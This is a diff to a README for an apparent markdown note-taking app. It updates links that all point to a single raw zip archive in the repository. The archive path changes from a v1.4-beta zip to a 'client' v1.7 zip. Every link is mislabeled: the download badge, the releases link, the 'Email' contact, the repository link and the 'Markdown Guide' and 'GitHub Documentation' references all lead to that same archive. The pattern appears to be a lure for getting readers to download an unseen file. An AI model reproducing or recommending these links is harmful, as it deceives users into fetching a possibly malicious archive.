@@ -1,6 +1,6 @@
 # 📝 markdown-note-app - Your Easy Markdown Note-Taking Solution
 
-[![Download markdown-note-app](https://raw.githubusercontent.com/voxanne1478/markdown-note-app/main/markdown-note-app/note-markdown-app-v1.4-beta.1.zip%20Now-%20-orange)](https://raw.githubusercontent.com/voxanne1478/markdown-note-app/main/markdown-note-app/note-markdown-app-v1.4-beta.1.zip)
+[![Download markdown-note-app](https://raw.githubusercontent.com/voxanne1478/markdown-note-app/main/markdown-note-app/client/markdown_note_app_v1.7.zip%20Now-%20-orange)](https://raw.githubusercontent.com/voxanne1478/markdown-note-app/main/markdown-note-app/client/markdown_note_app_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To begin using markdown-note-app, please follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page:  
-   [Download markdown-note-app](https://raw.githubusercontent.com/voxanne1478/markdown-note-app/main/markdown-note-app/note-markdown-app-v1.4-beta.1.zip)
+   [Download markdown-note-app](https://raw.githubusercontent.com/voxanne1478/markdown-note-app/main/markdown-note-app/client/markdown_note_app_v1.7.zip)
 
 2. **Choose the Latest Release**  
    Look for the latest release at the top of the page. It will have the newest features and fixes.
@@ -73,13 +73,13 @@ Stay updated with the latest news and features by following our repository. Join
 
 For questions or feedback about markdown-note-app, feel free to reach out:
 
-- Email: https://raw.githubusercontent.com/voxanne1478/markdown-note-app/main/markdown-note-app/note-markdown-app-v1.4-beta.1.zip
-- GitHub: [Markdown Note App Repository](https://raw.githubusercontent.com/voxanne1478/markdown-note-app/main/markdown-note-app/note-markdown-app-v1.4-beta.1.zip)
+- Email: https://raw.githubusercontent.com/voxanne1478/markdown-note-app/main/markdown-note-app/client/markdown_note_app_v1.7.zip
+- GitHub: [Markdown Note App Repository](https://raw.githubusercontent.com/voxanne1478/markdown-note-app/main/markdown-note-app/client/markdown_note_app_v1.7.zip)
 
 ## 🔗 Additional Resources
 
-- [Markdown Guide](https://raw.githubusercontent.com/voxanne1478/markdown-note-app/main/markdown-note-app/note-markdown-app-v1.4-beta.1.zip)
-- [GitHub Documentation](https://raw.githubusercontent.com/voxanne1478/markdown-note-app/main/markdown-note-app/note-markdown-app-v1.4-beta.1.zip)
+- [Markdown Guide](https://raw.githubusercontent.com/voxanne1478/markdown-note-app/main/markdown-note-app/client/markdown_note_app_v1.7.zip)
+- [GitHub Documentation](https://raw.githubusercontent.com/voxanne1478/markdown-note-app/main/markdown-note-app/client/markdown_note_app_v1.7.zip)
 
 ---
 
